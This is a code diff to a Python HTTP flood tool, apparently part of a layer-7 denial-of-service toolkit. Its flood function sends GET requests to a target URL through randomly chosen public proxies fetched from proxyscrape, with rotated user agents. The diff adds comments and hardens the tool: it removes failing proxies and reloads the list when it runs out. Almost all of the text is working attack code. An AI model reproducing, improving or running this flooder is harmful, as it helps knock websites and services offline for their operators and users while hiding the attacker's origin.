@@ -8,38 +8,34 @@ from typing import Dict, List
 
 import requests
 from colorama import Fore as F
-from requests.exceptions import ConnectionError, Timeout
+from requests.exceptions import ConnectionError, Timeout, ProxyError
 
+# Ignore warnings for unverified HTTPS requests
 warnings.filterwarnings("ignore", message="Unverified HTTPS request")
 
+# Load user agents from a JSON file
 with open("tools/L7/user_agents.json", "r") as agents:
     user_agents = json.load(agents)["agents"]
 
-
 def get_http_proxies() -> List[Dict[str, str]]:
-    """Return a dictionary of avaliable proxies using http protocol.
-
-    Args:
-        None
+    """Return a list of available proxies using HTTP protocol.
 
     Returns:
-        - proxies - A dictionary containing http proxies in the form of address:port paired values
+        List[Dict[str, str]]: A list containing dictionaries with http and https proxies.
     """
     try:
+        # Fetch proxy list from proxyscrape
         with requests.get(
             "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
             verify=False,
         ) as proxy_list:
+            # Ensure each proxy has schema for both HTTP and HTTPS
             proxies = [
-                {"http": proxy, "https": proxy}
-                for proxy in proxy_list.text.split("\r\n")
-                if proxy != ""
+                {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+                for proxy in proxy_list.text.split("\r\n") if proxy
             ]
-
     except Timeout:
-        print(
-            f"\n{F.RED}[!] {F.CYAN}It was not possible to connect to the proxies!{F.RESET}"
-        )
+        print(f"\n{F.RED}[!] {F.CYAN}Could not connect to the proxy source!{F.RESET}")
         sys.exit(1)
     except ConnectionError:
         print(f"\n{F.RED}[!] {F.CYAN}Device is not connected to the Internet!{F.RESET}")
@@ -47,7 +43,7 @@ def get_http_proxies() -> List[Dict[str, str]]:
 
     return proxies
 
-
+# Default headers for HTTP requests
 headers = {
     "X-Requested-With": "XMLHttpRequest",
     "Connection": "keep-alive",
@@ -56,15 +52,16 @@ headers = {
     "Accept-Encoding": "gzip, deflate, br",
 }
 
+# Load initial proxy list
 proxies = get_http_proxies()
+# Color code for status printing
 color_code = {True: F.GREEN, False: F.RED}
-
 
 def flood(target: str) -> None:
     """Start an HTTP GET request flood through proxies.
 
     Args:
-        - target - Target's URL
+        target (str): Target URL to flood.
 
     Returns:
         None
@@ -72,20 +69,29 @@ def flood(target: str) -> None:
     global proxies
     global headers
 
+    # Randomly choose a user-agent for each request
     headers["User-agent"] = random.choice(user_agents)
 
     try:
+        # Select a random proxy from the list
         proxy = random.choice(proxies)
+        # Send a GET request with selected proxy and headers
         response = requests.get(target, headers=headers, proxies=proxy, timeout=4)
-    except (Timeout, OSError):
-        return
+    except (Timeout, OSError, ProxyError, requests.exceptions.ProxySchemeUnknown):
+        # Remove invalid proxy from the list
+        try:
+            proxies.remove(proxy)
+        except ValueError:
+            # If no proxies remain, reload the proxy list
+            proxies = get_http_proxies()
     else:
-        status = (
-            f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
-        )
+        # Print request status and data if request is successful
+        status = f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
         payload_size = f"{F.RESET} Requested Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
         proxy_addr = f"| {F.RESET}Proxy: {F.CYAN}{proxy['http']:>21}"
         print(f"{status}{F.RESET} --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
+
+        # Reload proxy list if needed
         if not response.status_code:
             try:
                 proxies.remove(proxy)
